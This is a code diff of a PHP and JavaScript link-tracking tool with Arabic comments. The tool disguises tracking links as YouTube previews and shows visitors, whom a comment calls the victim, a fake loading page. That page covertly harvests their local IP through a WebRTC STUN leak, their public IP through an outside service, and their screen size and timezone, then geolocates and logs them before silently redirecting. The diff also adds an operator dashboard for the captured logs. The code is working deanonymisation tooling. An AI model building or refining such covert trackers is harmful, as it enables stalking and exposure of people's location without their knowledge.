@@ -7,7 +7,8 @@ ini_set('display_errors', 1);
 error_reporting(E_ALL);
 
 try {
-    $db = new PDO('sqlite:tracker.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+    $db = new PDO('sqlite:tracker.db');
+    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
     $db->exec("CREATE TABLE IF NOT EXISTS links (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
@@ -39,16 +40,17 @@ try {
 }
 
 // دالة سحب العنوان والصورة الأصلية ديناميكياً من أي موقع
-function fetch_real_meta($url) {$title = "";
+function fetch_real_meta($url) {
+    $title = "";
     $image = "";
 
-    if (preg_match('/(?:youtube\.com\/(?:[^\/]+\/.+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([^"&?\/\s]{11})/', $url,$matches)) {
-        $video_id =$matches[1];
+    if (preg_match('/(?:youtube\.com\/(?:[^\/]+\/.+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([^"&?\/\s]{11})/', $url, $matches)) {
+        $video_id = $matches[1];
         $image = "https://img.youtube.com/vi/{$video_id}/hqdefault.jpg";
         
         $oembed_url = "https://www.youtube.com/oembed?url=" . urlencode($url) . "&format=json";
         $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL,$oembed_url);
+        curl_setopt($ch, CURLOPT_URL, $oembed_url);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_TIMEOUT, 2);
         $json = curl_exec($ch);
@@ -57,13 +59,14 @@ function fetch_real_meta($url) {$title = "";
         if ($json) {
             $data = json_decode($json, true);
             if (isset($data['title'])) {
-                $title =$data['title'];
+                $title = $data['title'];
             }
         }
     }
 
-    if (empty($title)) {$ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL,$url);
+    if (empty($title)) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
         curl_setopt($ch, CURLOPT_TIMEOUT, 2);
@@ -150,10 +153,11 @@ function get_ip_details($ip) {
     return ['country' => 'Unknown', 'city' => 'Unknown', 'lat' => '36.7538', 'lon' => '3.0588', 'isp' => 'Unknown'];
 }
 
-// 1. معالجة التوجيه
-$og_title = "Secure Terminal";
+$og_title = "YouTube";
 $og_image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
+$target_redirect = "";
 
+// 1. معالجة طلب الزائر عبر رابط التعقب (إذا كان يحتوي على معامل r)
 if (isset($_GET['r'])) {
     $code =$_GET['r'];
     $stmt =$db->prepare("SELECT * FROM links WHERE code = ?");
@@ -161,31 +165,27 @@ if (isset($_GET['r'])) {
     $link =$stmt->fetch(PDO::FETCH_ASSOC);
 
     if ($link) {
-        $target =$link['target_url'];
+        $target_redirect =$link['target_url'];
         $og_title =$link['meta_title'];
         $og_image =$link['meta_image'];
 
-        $public_ip = get_real_ip();
-        // اعتماد القيمة الصحيحة الحقيقية للـ IP المحلي أو المطابق الفعلي
-        $local_ip = $_GET['lip'] ?? $public_ip;
-        
-        $port = $_SERVER['REMOTE_PORT'] ?? 'N/A';$geo = get_ip_details($public_ip);$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';$device = get_device_type($ua);$screen = $_GET['screen'] ?? 'N/A';$tz = $_GET['tz'] ?? 'N/A';$created_at = date('Y-m-d H:i:s');
+        // إذا أرسل السكريبت بيانات الشاشة والـ IP المحلي في الخلفية
+        if (isset($_GET['save_log']) &&$_GET['save_log'] == '1') {
+            $public_ip = get_real_ip();$local_ip = $_GET['lip'] ?? $public_ip;
+            $port = $_SERVER['REMOTE_PORT'] ?? 'N/A';$geo = get_ip_details($public_ip);$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';$device = get_device_type($ua);$screen = $_GET['screen'] ?? 'N/A';$tz = $_GET['tz'] ?? 'N/A';$created_at = date('Y-m-d H:i:s');
 
-        if (isset($_GET['screen'])) {
             try {
                 $logStmt =$db->prepare("INSERT INTO logs (code, public_ip, local_ip, port, country, city, lat, lon, isp, device_info, screen_res, timezone, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
                 $logStmt->execute([$code, $public_ip,$local_ip, $port,$geo['country'], $geo['city'],$geo['lat'], $geo['lon'],$geo['isp'], $device,$screen, $tz,$created_at]);
             } catch (Exception $e) {}
-
-            header("Location: " . $target);
-            exit();
+            exit('OK');
         }
     } else {
         die("Link not found.");
     }
 }
 
-// 2. إنشاء رابط جديد
+// 2. إنشاء رابط جديد من لوحة التحكم
 $generated_link = "";
 $tracking_code = "";
 if ($_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['create'])) {
@@ -204,7 +204,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['create'])) {
     $domain = $_SERVER['HTTP_HOST'];$generated_link = "https://" . $domain . "/?r=" . $code;
 }
 
-// جلب السجلات بشكل مستقل لكل كود بحث
+// جلب السجلات للوحة التحكم
 $filter_code = trim($_GET['track'] ?? '');
 if (!empty($filter_code)) {
     $stmt =$db->prepare("SELECT * FROM logs WHERE code = ? ORDER BY id DESC");
@@ -213,18 +213,92 @@ if (!empty($filter_code)) {
 } else {
     $logs =$db->query("SELECT * FROM logs ORDER BY id DESC LIMIT 50")->fetchAll(PDO::FETCH_ASSOC);
 }
+
+// إذا كان الطلب عبارة عن زيارة رابط تعقب (موجه للضحية)، نعرض واجهة وهمية تخفي لوحة التحكم تماماً وتوجهه لليوتيوب
+if (isset($_GET['r']) && !empty($target_redirect)):
 ?>
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title><?php echo htmlspecialchars($og_title); ?></title>
-    
     <meta property="og:title" content="<?php echo htmlspecialchars($og_title); ?>">
     <meta property="og:image" content="<?php echo htmlspecialchars($og_image); ?>">
     <meta property="og:type" content="website">
+    <style>
+        body { background-color: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        .loader { border: 4px solid rgba(255,255,255,0.1); width: 40px; height: 40px; border-radius: 50%; border-left-color: #ff0000; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+    <script>
+        function getLocalIP(callback) {
+            let foundLocal = false;
+            let RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+            if (!RTCPeerConnection) {
+                fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => callback(data.ip)).catch(() => callback("Unknown"));
+                return;
+            }
+            let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+            pc.createDataChannel("");
+            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
+            pc.onicecandidate = function(ice) {
+                if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+                let myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
+                if (myIP) {
+                    let ip = myIP[1];
+                    if (ip.startsWith("192.168.") || ip.startsWith("10.") || ip.startsWith("172.")) {
+                        if (!foundLocal) {
+                            foundLocal = true;
+                            callback(ip);
+                            pc.onicecandidate = null;
+                        }
+                    }
+                }
+            };
+            setTimeout(() => {
+                if (!foundLocal) {
+                    fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => callback(data.ip)).catch(() => callback("Direct"));
+                }
+            }, 80);
+        }
 
+        document.addEventListener("DOMContentLoaded", function() {
+            const redirectCode = "<?php echo htmlspecialchars($_GET['r']); ?>";
+            const targetUrl = "<?php echo $target_redirect; ?>";
+
+            getLocalIP(function(localIp) {
+                const screenRes = screen.width + "x" + screen.height;
+                const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                const logUrl = `/?r=${redirectCode}&save_log=1&lip=${encodeURIComponent(localIp)}&screen=${encodeURIComponent(screenRes)}&tz=${encodeURIComponent(tz)}`;
+                
+                if (navigator.sendBeacon) {
+                    navigator.sendBeacon(logUrl);
+                } else {
+                    fetch(logUrl, { method: 'GET', keepalive: true });
+                }
+
+                setTimeout(function() {
+                    window.location.replace(targetUrl);
+                }, 150);
+            });
+        });
+    </script>
+</head>
+<body>
+    <div class="loader"></div>
+</body>
+</html>
+<?php 
+    exit(); 
+endif; 
+?>
+<!-- لوحة التحكم الخاصة بك (تظهر فقط لك عندما تزور الرابط الرئيسي دون المعامل r) -->
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>لوحة التحكم والتعقب</title>
     <style>
         :root {
             --bg-main: #0b0f17;
@@ -285,63 +359,6 @@ if (!empty($filter_code)) {
         footer span { color: #38bdf8; font-weight: 600; }
     </style>
     <script>
-        function getLocalIP(callback) {
-            let foundLocal = false;
-            let RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
-            
-            if (!RTCPeerConnection) {
-                fetch('https://api.ipify.org?format=json')
-                    .then(res => res.json())
-                    .then(data => callback(data.ip))
-                    .catch(() => callback("Unknown"));
-                return;
-            }
-
-            let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
-            pc.createDataChannel("");
-            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
-            
-            pc.onicecandidate = function(ice) {
-                if (!ice || !ice.candidate || !ice.candidate.candidate) return;
-                let myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
-                if (myIP) {
-                    let ip = myIP[1];
-                    // إذا وجدنا IP محلي حقيقي (واي فاي)
-                    if (ip.startsWith("192.168.") || ip.startsWith("10.") || ip.startsWith("172.")) {
-                        if (!foundLocal) {
-                            foundLocal = true;
-                            callback(ip);
-                            pc.onicecandidate = null;
-                        }
-                    }
-                }
-            };
-
-            // إذا انتهت المهلة ولم يتم العثور على شبكة محلية (أي أنه على بيانات الجوال)، نجلب الـ IP الحقيقي الصحيح عبر خدمة خارجية مباشرة
-            setTimeout(() => {
-                if (!foundLocal) {
-                    fetch('https://api.ipify.org?format=json')
-                        .then(res => res.json())
-                        .then(data => callback(data.ip))
-                        .catch(() => callback("127.0.0.1"));
-                }
-            }, 100);
-        }
-
-        document.addEventListener("DOMContentLoaded", function() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const redirectCode = urlParams.get('r');
-            const hasScreen = urlParams.has('screen');
-
-            if (redirectCode && !hasScreen) {
-                getLocalIP(function(localIp) {
-                    const screenRes = screen.width + "x" + screen.height;
-                    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                    window.location.href = `/?r=${redirectCode}&lip=${encodeURIComponent(localIp)}&screen=${encodeURIComponent(screenRes)}&tz=${encodeURIComponent(tz)}`;
-                });
-            }
-        });
-
         async function pasteClipboard(inputName) {
             try {
                 const text = await navigator.clipboard.readText();
@@ -405,7 +422,7 @@ if (!empty($filter_code)) {
                 <h2>سجلات الزيارات والتحليلات الحية</h2>
                 <form method="GET" class="search-form">
                     <button type="button" class="action-btn-inline" onclick="pasteClipboard('track')" style="height: 42px;">لصق</button>
-                    <input type="text" name="track" placeholder="بحث بكود التعقب..." value="<?php echo htmlspecialchars($filter_code); ?>" style="height: 42px;[span_0](start_span)"[span_0](end_span)>
+                    <input type="text" name="track" placeholder="بحث بكود التعقب..." value="<?php echo htmlspecialchars($filter_code); ?>" style="height: 42px;">
                     <button type="submit" class="btn" style="height: 42px;">بحث</button>
                     <?php if(!empty($filter_code)): ?>
                         <a href="/" class="btn btn-danger" style="height: 42px; text-decoration:none; display:flex; align-items:center;">إلغاء</a>
